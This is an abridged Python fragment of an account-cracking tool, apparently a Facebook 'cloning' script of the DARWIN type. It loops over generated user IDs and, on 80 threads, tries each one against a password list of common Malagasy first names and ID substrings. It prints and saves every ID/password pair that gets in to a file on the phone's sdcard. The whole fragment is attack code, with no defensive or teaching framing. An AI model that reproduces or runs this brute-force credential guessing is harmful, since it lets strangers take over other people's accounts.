...
def BD_CLONING():
    ...
    with tred(max_workers=80) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','nomena','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fitiavana','Fitiavana','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','avotra','Avotra','domoina','Domoina','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','mandresy','Mandresy','andriatsitohaina','Andriatsitohaina','sarobidy','Sarobidy','lalaina','Lafatra','lalatiana','Lalatiana','lalaina','Lalaina','tahiana','Tahiana','kanto','Kanto']
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[DARWIN-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                ...
                print('\r\r \033[1;30m[DARWIN-CP] '+ids+' | '+pas+'\033[1;37m')
                # Enregistrer dans le fichier DARWIN-CP.txt
                with open(os.path.join("/sdcard/DARWIN-IDS", "DARWIN-CP.txt"), 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
